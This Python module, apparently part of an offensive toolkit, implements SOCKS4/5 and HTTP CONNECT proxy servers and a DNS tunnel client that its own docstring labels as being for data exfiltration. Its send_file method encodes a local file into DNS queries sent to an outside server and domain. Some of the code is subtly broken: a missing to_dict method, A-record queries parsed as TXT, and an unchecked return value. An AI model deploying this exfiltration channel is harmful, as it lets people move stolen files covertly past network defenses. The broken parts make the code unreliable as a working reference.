#!/usr/bin/env python3
"""
Tunnel Module
Basic tunneling - SOCKS proxy, HTTP CONNECT, DNS tunneling
"""

import socket
import ssl
import struct
import threading
import select
import time
from typing import Optional, Tuple, Callable
from enum import IntEnum


class TunnelType(IntEnum):
    SOCKS4 = 1
    SOCKS5 = 2
    HTTP_CONNECT = 3
    DNS = 4


class SocksError(Exception):
    """SOCKS protocol error"""
    pass


class TunnelSession:
    """Single tunnel session"""
    
    def __init__(self, tunnel_type: TunnelType, src: Tuple[str, int], dst: Tuple[str, int]):
        self.tunnel_type = tunnel_type
        self.src = src
        self.dst = dst
        self.created_at = time.time()
        self.last_activity = time.time()
        self.bytes_sent = 0
        self.bytes_recv = 0
        self.active = True
        self._client_sock: Optional[socket.socket] = None
        self._remote_sock: Optional[socket.socket] = None
    
    @property
    def idle_time(self) -> float:
        return time.time() - self.last_activity
    
    @property
    def duration(self) -> float:
        return time.time() - self.created_at
    
    def close(self) -> None:
        """Close both ends of tunnel"""
        self.active = False
        for sock in [self._client_sock, self._remote_sock]:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        self._client_sock = None
        self._remote_sock = None
    
    def relay(self, timeout: float = 30.0) -> None:
        """Bidirectional data relay"""
        if not self._client_sock or not self._remote_sock:
            return
        
        sockets = [self._client_sock, self._remote_sock]
        buffer_size = 65535
        
        while self.active:
            try:
                readable, _, errored = select.select(sockets, [], sockets, timeout)
                
                if errored:
                    break
                
                if not readable:
                    if self.idle_time > timeout:
                        break
                    continue
                
                for sock in readable:
                    try:
                        data = sock.recv(buffer_size)
                        if not data:
                            self.close()
                            return
                        
                        if sock == self._client_sock:
                            self._remote_sock.sendall(data)
                            self.bytes_sent += len(data)
                        else:
                            self._client_sock.sendall(data)
                            self.bytes_recv += len(data)
                        
                        self.last_activity = time.time()
                    except Exception:
                        self.close()
                        return
            except Exception:
                break
        
        self.close()


class Socks4Tunnel:
    """SOCKS4/4a proxy tunnel"""
    
    def __init__(self, bind_addr: str = '0.0.0.0', bind_port: int = 1080, timeout: float = 30.0):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self.timeout = timeout
        self._sessions: list = []
        self._lock = threading.Lock()
    
    def _handle_client(self, client_sock: socket.socket, client_addr: Tuple[str, int]) -> None:
        """Handle SOCKS4 client connection"""
        try:
            # Read SOCKS4 request
            data = client_sock.recv(1024)
            if len(data) < 9:
                client_sock.close()
                return
            
            version = data[0]
            if version != 4:
                client_sock.close()
                return
            
            cmd = data[1]
            dst_port = struct.unpack('!H', data[2:4])[0]
            dst_ip = '.'.join(str(b) for b in data[4:8])
            
            # SOCKS4a - domain name
            if dst_ip.startswith('0.0.0.'):
                null_idx = data.index(b'\x00', 8)
                dst_ip = data[8:null_idx].decode('utf-8', errors='ignore')
            
            # Connect to target
            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_sock.settimeout(self.timeout)
            remote_sock.connect((dst_ip, dst_port))
            
            # Send success response
            response = struct.pack('!BBH4s', 0, 90, 0, b'\x00\x00\x00\x00')
            client_sock.sendall(response)
            
            # Create session and relay
            session = TunnelSession(TunnelType.SOCKS4, client_addr, (dst_ip, dst_port))
            session._client_sock = client_sock
            session._remote_sock = remote_sock
            
            with self._lock:
                self._sessions.append(session)
            
            session.relay(self.timeout)
            
            with self._lock:
                if session in self._sessions:
                    self._sessions.remove(session)
        
        except Exception:
            try:
                client_sock.close()
            except Exception:
                pass
    
    def start(self) -> None:
        """Start SOCKS4 proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.bind_addr, self.bind_port))
        server.listen(100)
        
        print(f"[*] SOCKS4 proxy listening on {self.bind_addr}:{self.bind_port}")
        
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=self._handle_client, args=(client_sock, client_addr), daemon=True)
            t.start()
    
    def get_sessions(self) -> list:
        """Get active sessions"""
        with self._lock:
            return [s.to_dict() for s in self._sessions if s.active]


class Socks5Tunnel:
    """SOCKS5 proxy tunnel"""
    
    AUTH_NONE = 0x00
    AUTH_PASSWORD = 0x02
    AUTH_NO_ACCEPTABLE = 0xFF
    
    CMD_CONNECT = 0x01
    CMD_BIND = 0x02
    CMD_UDP = 0x03
    
    ATYP_IPV4 = 0x01
    ATYP_DOMAIN = 0x03
    ATYP_IPV6 = 0x04
    
    REP_SUCCESS = 0x00
    REP_FAILURE = 0x01
    REP_NOT_ALLOWED = 0x02
    REP_NETWORK_UNREACHABLE = 0x03
    REP_HOST_UNREACHABLE = 0x04
    REP_CONNECTION_REFUSED = 0x05
    REP_COMMAND_NOT_SUPPORTED = 0x07
    REP_ADDRESS_NOT_SUPPORTED = 0x08
    
    def __init__(self, bind_addr: str = '0.0.0.0', bind_port: int = 1080,
                 auth_required: bool = False, username: str = '', password: str = '',
                 timeout: float = 30.0):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self.auth_required = auth_required
        self.username = username
        self.password = password
        self.timeout = timeout
        self._sessions: list = []
        self._lock = threading.Lock()
    
    def _send_error(self, sock: socket.socket, code: int) -> None:
        response = struct.pack('!BBB', 5, code, 0)
        sock.sendall(response)
    
    def _auth_negotiation(self, sock: socket.socket) -> bool:
        """Handle SOCKS5 auth negotiation"""
        data = sock.recv(256)
        if len(data) < 3 or data[0] != 5:
            return False
        
        nmethods = data[1]
        methods = data[2:2 + nmethods]
        
        if self.auth_required:
            if self.AUTH_PASSWORD not in methods:
                self._send_error(sock, self.AUTH_NO_ACCEPTABLE)
                return False
            sock.sendall(struct.pack('!BB', 5, self.AUTH_PASSWORD))
            
            # Password auth
            auth_data = sock.recv(256)
            if len(auth_data) < 5:
                return False
            
            version = auth_data[0]
            ulen = auth_data[1]
            uname = auth_data[2:2 + ulen].decode()
            plen = auth_data[2 + ulen]
            passwd = auth_data[3 + ulen:3 + ulen + plen].decode()
            
            if uname == self.username and passwd == self.password:
                sock.sendall(struct.pack('!BB', 1, 0))
                return True
            else:
                sock.sendall(struct.pack('!BB', 1, 1))
                return False
        else:
            if self.AUTH_NONE not in methods:
                self._send_error(sock, self.AUTH_NO_ACCEPTABLE)
                return False
            sock.sendall(struct.pack('!BB', 5, self.AUTH_NONE))
            return True
    
    def _parse_request(self, sock: socket.socket) -> Optional[Tuple[str, int]]:
        """Parse SOCKS5 connect request"""
        data = sock.recv(256)
        if len(data) < 7 or data[0] != 5:
            return None
        
        cmd = data[1]
        if cmd != self.CMD_CONNECT:
            self._send_reply(sock, self.REP_COMMAND_NOT_SUPPORTED)
            return None
        
        atyp = data[3]
        
        if atyp == self.ATYP_IPV4:
            dst_ip = '.'.join(str(b) for b in data[4:8])
            dst_port = struct.unpack('!H', data[8:10])[0]
        elif atyp == self.ATYP_DOMAIN:
            domain_len = data[4]
            dst_ip = data[5:5 + domain_len].decode()
            dst_port = struct.unpack('!H', data[5 + domain_len:7 + domain_len])[0]
        elif atyp == self.ATYP_IPV6:
            dst_ip = socket.inet_ntop(socket.AF_INET6, data[4:20])
            dst_port = struct.unpack('!H', data[20:22])[0]
        else:
            self._send_reply(sock, self.REP_ADDRESS_NOT_SUPPORTED)
            return None
        
        return dst_ip, dst_port
    
    def _send_reply(self, sock: socket.socket, code: int, bind_addr: str = '0.0.0.0', bind_port: int = 0) -> None:
        """Send SOCKS5 reply"""
        reply = struct.pack('!BBBB', 5, code, 0, 1)
        reply += socket.inet_aton(bind_addr)
        reply += struct.pack('!H', bind_port)
        sock.sendall(reply)
    
    def _handle_client(self, client_sock: socket.socket, client_addr: Tuple[str, int]) -> None:
        """Handle SOCKS5 client"""
        try:
            if not self._auth_negotiation(client_sock):
                client_sock.close()
                return
            
            result = self._parse_request(client_sock)
            if not result:
                client_sock.close()
                return
            
            dst_ip, dst_port = result
            
            # Connect to target
            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_sock.settimeout(self.timeout)
            remote_sock.connect((dst_ip, dst_port))
            
            # Get local bind address for reply
            local_addr = remote_sock.getsockname()
            self._send_reply(client_sock, self.REP_SUCCESS, local_addr[0], local_addr[1])
            
            # Relay
            session = TunnelSession(TunnelType.SOCKS5, client_addr, (dst_ip, dst_port))
            session._client_sock = client_sock
            session._remote_sock = remote_sock
            
            with self._lock:
                self._sessions.append(session)
            
            session.relay(self.timeout)
            
            with self._lock:
                if session in self._sessions:
                    self._sessions.remove(session)
        
        except ConnectionRefusedError:
            self._send_reply(client_sock, self.REP_CONNECTION_REFUSED)
            client_sock.close()
        except socket.gaierror:
            self._send_reply(client_sock, self.REP_HOST_UNREACHABLE)
            client_sock.close()
        except Exception:
            try:
                client_sock.close()
            except Exception:
                pass
    
    def start(self) -> None:
        """Start SOCKS5 proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.bind_addr, self.bind_port))
        server.listen(100)
        
        print(f"[*] SOCKS5 proxy listening on {self.bind_addr}:{self.bind_port}")
        
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=self._handle_client, args=(client_sock, client_addr), daemon=True)
            t.start()


class HTTPConnectTunnel:
    """HTTP CONNECT proxy tunnel"""
    
    def __init__(self, bind_addr: str = '0.0.0.0', bind_port: int = 8080, timeout: float = 30.0):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self.timeout = timeout
        self._sessions: list = []
        self._lock = threading.Lock()
    
    def _handle_client(self, client_sock: socket.socket, client_addr: Tuple[str, int]) -> None:
        """Handle HTTP CONNECT client"""
        try:
            data = client_sock.recv(4096)
            request = data.decode('utf-8', errors='ignore')
            
            if not request.startswith('CONNECT'):
                client_sock.sendall(b'HTTP/1.1 400 Bad Request\r\n\r\n')
                client_sock.close()
                return
            
            # Parse CONNECT request
            lines = request.split('\r\n')
            target = lines[0].split(' ')[1]
            
            if ':' in target:
                dst_host, dst_port = target.rsplit(':', 1)
                dst_port = int(dst_port)
            else:
                dst_host = target
                dst_port = 443
            
            # Resolve hostname
            dst_ip = socket.gethostbyname(dst_host)
            
            # Connect to target
            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_sock.settimeout(self.timeout)
            remote_sock.connect((dst_ip, dst_port))
            
            # Send success
            client_sock.sendall(b'HTTP/1.1 200 Connection Established\r\n\r\n')
            
            # Relay
            session = TunnelSession(TunnelType.HTTP_CONNECT, client_addr, (dst_ip, dst_port))
            session._client_sock = client_sock
            session._remote_sock = remote_sock
            
            with self._lock:
                self._sessions.append(session)
            
            session.relay(self.timeout)
            
            with self._lock:
                if session in self._sessions:
                    self._sessions.remove(session)
        
        except Exception:
            try:
                client_sock.close()
            except Exception:
                pass
    
    def start(self) -> None:
        """Start HTTP CONNECT proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.bind_addr, self.bind_port))
        server.listen(100)
        
        print(f"[*] HTTP CONNECT proxy listening on {self.bind_addr}:{self.bind_port}")
        
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=self._handle_client, args=(client_sock, client_addr), daemon=True)
            t.start()


class DNSTunnel:
    """DNS tunneling client for data exfiltration"""
    
    def __init__(self, dns_server: str, domain: str, encoding: str = 'hex'):
        self.dns_server = dns_server
        self.domain = domain
        self.encoding = encoding
        self._sock: Optional[socket.socket] = None
        self._txid = 0
    
    def _build_query(self, hostname: str) -> bytes:
        """Build DNS query for tunnel data"""
        self._txid = (self._txid + 1) & 0xFFFF
        
        header = struct.pack('!HHHHHH', self._txid, 0x0100, 1, 0, 0, 0)
        
        qname = b''
        for label in hostname.split('.'):
            qname += bytes([len(label)]) + label.encode()
        qname += b'\x00'
        
        question = qname + struct.pack('!HH', 1, 1)  # A record, IN class
        return header + question
    
    def _parse_response(self, data: bytes) -> Optional[str]:
        """Parse DNS response for tunneled data"""
        if len(data) < 12:
            return None
        
        answers = struct.unpack('!H', data[6:8])[0]
        offset = 12
        
        # Skip question section
        while offset < len(data) and data[offset] != 0:
            label_len = data[offset]
            if label_len & 0xC0 == 0xC0:
                offset += 2
                break
            offset += label_len + 1
        else:
            offset += 1
        offset += 4  # QTYPE + QCLASS
        
        # Parse answers
        for _ in range(answers):
            if offset >= len(data):
                break
            
            # Name (pointer or label)
            if data[offset] & 0xC0 == 0xC0:
                offset += 2
            else:
                while offset < len(data) and data[offset] != 0:
                    offset += data[offset] + 1
                offset += 1
            
            if offset + 10 > len(data):
                break
            
            rtype = struct.unpack('!H', data[offset:offset + 2])[0]
            rdlength = struct.unpack('!H', data[offset + 8:offset + 10])[0]
            offset += 10
            
            if rtype == 16:  # TXT record
                txt_data = data[offset:offset + rdlength]
                # Strip TXT length prefix
                if txt_data and txt_data[0] == len(txt_data) - 1:
                    txt_data = txt_data[1:]
                return txt_data.decode('utf-8', errors='ignore')
            
            offset += rdlength
        
        return None
    
    def _encode_data(self, data: bytes) -> str:
        """Encode data for DNS label format"""
        if self.encoding == 'hex':
            return data.hex()
        elif self.encoding == 'base32':
            import base64
            return base64.b32encode(data).decode().rstrip('=')
        elif self.encoding == 'base64':
            import base64
            return base64.b64encode(data).decode().rstrip('=')
        return data.hex()
    
    def _decode_data(self, data: str) -> bytes:
        """Decode data from DNS response"""
        if self.encoding == 'hex':
            return bytes.fromhex(data)
        elif self.encoding == 'base32':
            import base64
            padding = 8 - (len(data) % 8)
            return base64.b32decode(data + '=' * padding)
        elif self.encoding == 'base64':
            import base64
            padding = 4 - (len(data) % 4)
            return base64.b64decode(data + '=' * padding)
        return bytes.fromhex(data)
    
    def _chunk_subdomain(self, encoded: str, chunk_size: int = 63) -> list:
        """Split encoded data into DNS-label-safe chunks"""
        chunks = []
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i + chunk_size]
            # DNS labels can't start/end with hyphen, max 63 chars
            chunk = chunk.replace('-', '0')
            chunks.append(chunk)
        return chunks
    
    def send(self, data: bytes) -> Optional[bytes]:
        """Send data through DNS tunnel"""
        encoded = self._encode_data(data)
        chunks = self._chunk_subdomain(encoded, 50)
        
        response_data = b''
        
        for i, chunk in enumerate(chunks):
            hostname = f"{chunk}.{i}.{self.domain}"
            query = self._build_query(hostname)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5.0)
            sock.sendto(query, (self.dns_server, 53))
            
            try:
                response, _ = sock.recvfrom(65535)
                decoded = self._parse_response(response)
                if decoded:
                    response_data += self._decode_data(decoded)
            except socket.timeout:
                pass
            finally:
                sock.close()
        
        return response_data if response_data else None
    
    def send_file(self, filepath: str, chunk_size: int = 200) -> bool:
        """Send file through DNS tunnel"""
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Split into chunks for multiple queries
        offset = 0
        seq = 0
        
        while offset < len(data):
            chunk = data[offset:offset + chunk_size]
            result = self.send(chunk)
            offset += chunk_size
            seq += 1
        
        return True
